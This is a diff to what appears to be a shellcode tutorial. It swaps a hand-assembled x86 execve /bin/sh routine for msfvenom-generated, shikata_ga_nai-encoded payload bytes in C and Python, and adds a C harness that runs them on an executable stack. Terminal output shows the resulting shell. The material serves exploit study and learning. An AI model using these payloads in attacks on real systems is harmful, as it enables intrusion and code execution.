@@ -53,8 +53,8 @@ $ echo "\"$(objdump -d ./shell64 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 
 "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 
 
-$ cat shell.c
-// gcc -m64 -fno-stack-protector -z execstack shell.c -o shell
+$ cat shell64.c
+// gcc -m64 -fno-stack-protector -z execstack shell64.c -o shell64
 #include <stdio.h>
 
 int main()
@@ -65,86 +65,79 @@ int main()
     ret();
 }
 
-$ gcc -m64 -fno-stack-protector -z execstack shell.c -o shell
-$ ./shell
+$ gcc -m64 -fno-stack-protector -z execstack shell64.c -o shell64
+$ ./shell64
 $ id
 uid=1000(user) gid=1000(user) groups=1000(user)
 
 ```
 
 
-# &#35; linux x86
-#### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
-#### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>
+# &#35; linux x86 using Metasploit
 
 ```bash
-$ cat shell32.s
-; nasm -f elf32 shell32.s -o shell32.o
-; ld -m elf_i386 -s shell32.o -o shell32
-; echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
+$ ./msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux -f c -b "\x00\x0a\0d"
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 72 (iteration=0)
+x86/shikata_ga_nai chosen with final size 72
+Payload size: 72 bytes
+Final size of c file: 327 bytes
+unsigned char buf[] =
+"\xdb\xc1\xbe\x0b\x72\xce\x2b\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
+"\x0c\x31\x73\x18\x03\x73\x18\x83\xc3\x0f\x90\x3b\x41\x04\x0c"
+"\x5d\xc4\x7c\xc4\x70\x8a\x09\xf3\xe3\x63\x7a\x94\xf3\x13\x53"
+"\x06\x9d\x8d\x22\x25\x0f\xba\x3e\xaa\xb0\x3a\x11\xc8\xd9\x54"
+"\x42\x6e\x7b\xda\xf4\x6e\x2c\x4f\x8d\x8e\x1f\xef";
+
+$ ./msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux -f python -b "\x00\x0a\0d"
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 72 (iteration=0)
+x86/shikata_ga_nai chosen with final size 72
+Payload size: 72 bytes
+Final size of python file: 365 bytes
+buf =  b""
+buf += b"\xd9\xeb\xba\x91\x9e\xb2\xa7\xd9\x74\x24\xf4\x58\x33"
+buf += b"\xc9\xb1\x0c\x31\x50\x18\x03\x50\x18\x83\xe8\x6d\x7c"
+buf += b"\x47\xcd\x86\xd9\x31\x40\xfe\xb1\x6c\x06\x77\xa6\x07"
+buf += b"\xe7\xf4\x41\xd8\x9f\xd5\xf3\xb1\x31\xa0\x17\x13\x26"
+buf += b"\xb8\xd7\x94\xb6\x93\xb5\xfd\xd8\xc4\x5b\x9f\x57\x72"
+buf += b"\x9c\x08\xcb\x0b\x7d\x7b\x6b"
 
 
-section .text
-    global _start
-
-_start:
-    xor eax,eax		; safe null
-    push eax		; push null byte onto stack
-    push 0x68732f2f 	; push /bin//sh
-    push 0x6e69622f
-    mov ebx,esp		; set ebx to out cmd
-    mov ecx,eax		; no args
-    mov edx,eax		; no args again
-    mov al,0xb		; set sys_execve
-    int 0x80
-user@pwn:/pwn/shell$
-
-
-$ nasm -f elf32 shell32.s -o shell32.o
-$ ld -m elf_i386 -s shell32.o -o shell32
-$ ./shell32
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
-
-$ objdump -M intel -D ./shell32
-
-./shell32:     file format elf32-i386
-
-
-Disassembly of section .text:
-
-08049000 <.text>:
- 8049000:	31 c0                	xor    eax,eax
- 8049002:	50                   	push   eax
- 8049003:	68 2f 2f 73 68       	push   0x68732f2f
- 8049008:	68 2f 62 69 6e       	push   0x6e69622f
- 804900d:	89 e3                	mov    ebx,esp
- 804900f:	89 c1                	mov    ecx,eax
- 8049011:	89 c2                	mov    edx,eax
- 8049013:	b0 0b                	mov    al,0xb
- 8049015:	cd 80                	int    0x80
- 
-
-$ echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
-"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
-
-
-$ cat shell.c
+$ cat shell32.c
 // gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell32
 #include <stdio.h>
 
 int main()
 {
     unsigned char shellcode[] = \
-        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
+        "\xdb\xc1\xbe\x0b\x72\xce\x2b\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
+        "\x0c\x31\x73\x18\x03\x73\x18\x83\xc3\x0f\x90\x3b\x41\x04\x0c"
+        "\x5d\xc4\x7c\xc4\x70\x8a\x09\xf3\xe3\x63\x7a\x94\xf3\x13\x53"
+        "\x06\x9d\x8d\x22\x25\x0f\xba\x3e\xaa\xb0\x3a\x11\xc8\xd9\x54"
+        "\x42\x6e\x7b\xda\xf4\x6e\x2c\x4f\x8d\x8e\x1f\xef";
     int (*ret)() = (int(*)())shellcode;
     ret();
-}
 
 
 $ gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell32
-$ ./shell32
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
+$ ps
+  PID TTY          TIME CMD
+ 6338 pts/3    00:00:00 bash
+11005 pts/3    00:00:00 ps
+user@pwn:~$ ./shell32
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+user@pwn:/home/user$ ps
+  PID TTY          TIME CMD
+ 6338 pts/3    00:00:00 bash
+11006 pts/3    00:00:00 sh
+11007 pts/3    00:00:00 bash
+11015 pts/3    00:00:00 ps
+user@pwn:/home/user$
 
 ```
+
